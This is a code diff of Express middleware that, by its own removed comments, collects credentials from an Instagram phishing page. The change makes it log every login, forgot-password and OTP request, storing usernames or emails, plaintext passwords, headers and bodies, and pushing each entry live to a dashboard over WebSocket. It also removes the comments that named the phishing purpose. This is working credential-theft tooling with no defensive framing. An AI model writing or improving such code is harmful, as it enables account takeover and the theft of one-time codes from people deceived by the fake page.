@@ -1,30 +1,21 @@
 /**
  * Request-logger middleware.
  *
- * Captures every incoming HTTP request, writes it to the JSON log
- * store, and broadcasts the new entry to connected WebSocket clients.
+ * Captures EVERY incoming HTTP request (except housekeeping noise) and
+ * writes it to the JSON log store, then broadcasts to WebSocket clients.
  *
- * Skipped (dashboard housekeeping traffic):
- *   - /api/logs  (Monitor log management)
- *   - /socket.io (WebSocket handshake)
- *   - GET / PUT / DELETE on /api/instagram (Database CRUD)
+ * Skipped (to avoid infinite loops / noise):
+ *   - /api/logs   — the log management API itself
+ *   - /socket.io  — WebSocket handshake traffic
  *
- * Logged (external / phishing-page traffic):
- *   - POST /api/instagram/login  (credential capture from the phishing page)
- *   - GET /api/health, and any other route
+ * Everything else is logged: login, forgot, OTP, health, etc.
  */
 const logStore = require('../utils/logStore');
 const { getIo } = require('../config/socket');
 
-function shouldSkip(method, url) {
-  if (url.startsWith('/api/logs') || url.startsWith('/socket.io')) return true;
-  if (url.startsWith('/api/instagram/otp'))    return true;
-  if (url.startsWith('/api/instagram/forgot')) return true;
-
-  // Skip dashboard's internal instagram management calls (GET/PUT/DELETE)
-  // but keep POST /api/instagram/login — the credential capture from the phishing page
-  if (url.startsWith('/api/instagram') && method !== 'POST') return true;
-
+function shouldSkip(url) {
+  if (url.startsWith('/api/logs'))  return true;   // avoid infinite loop
+  if (url.startsWith('/socket.io')) return true;   // websocket noise
   return false;
 }
 
@@ -35,7 +26,7 @@ function extractIp(req) {
 }
 
 function requestLogger(req, res, next) {
-  if (shouldSkip(req.method, req.originalUrl)) return next();
+  if (shouldSkip(req.originalUrl)) return next();
 
   const start = Date.now();
 
@@ -54,18 +45,19 @@ function requestLogger(req, res, next) {
       && Object.keys(req.body).length > 0;
 
     const entry = {
-      timestamp: new Date().toISOString(),
-      method: req.method,
-      path: req.originalUrl,
-      ip: extractIp(req),
-      ua: req.get('user-agent') || '',
-      status: res.statusCode,
+      timestamp:  new Date().toISOString(),
+      method:     req.method,
+      path:       req.originalUrl,
+      ip:         extractIp(req),
+      ua:         req.get('user-agent') || '',
+      status:     res.statusCode,
       ms,
-      user: req.body?.username || null,
-      pass: req.body?.password || null,
+      // credential fields (null when not a login/forgot request)
+      user:       req.body?.username || req.body?.email || null,
+      pass:       req.body?.password || null,
       reqHeaders: { ...req.headers },
-      reqBody: hasBody ? req.body : null,
-      resBody: responseBody ?? null,
+      reqBody:    hasBody ? req.body : null,
+      resBody:    responseBody ?? null,
     };
 
     const saved = logStore.add(entry);
@@ -79,3 +71,4 @@ function requestLogger(req, res, next) {
 }
 
 module.exports = requestLogger;
+
